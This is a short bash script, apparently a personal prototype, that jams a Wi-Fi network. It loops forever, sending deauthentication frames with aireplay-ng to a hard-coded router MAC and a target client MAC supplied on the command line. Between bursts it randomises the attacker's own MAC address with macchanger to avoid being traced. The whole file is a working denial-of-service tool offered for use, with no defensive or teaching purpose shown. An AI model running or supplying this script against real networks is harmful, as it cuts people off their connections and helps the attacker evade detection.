#!/bin/bash
#this is a prototype, now able to choose target manually outside of script
#sends deauth signal to router, jamming it

if [ "$1" == "" ]
then
echo "This is a targetted version of jam"
echo "Please, enter a MAC address of target"
echo "Syntax: ./jamC.sh 00:00:00:00:00:00"

else

while true
do
	aireplay-ng -0 5 -a 10:86:8C:5D:6F:26 -c $1 wlan0
	iwconfig wlan0 channel 1

	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New Mac"

	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan0 | grep Mode

	sleep 3
	echo Waiting
done
fi
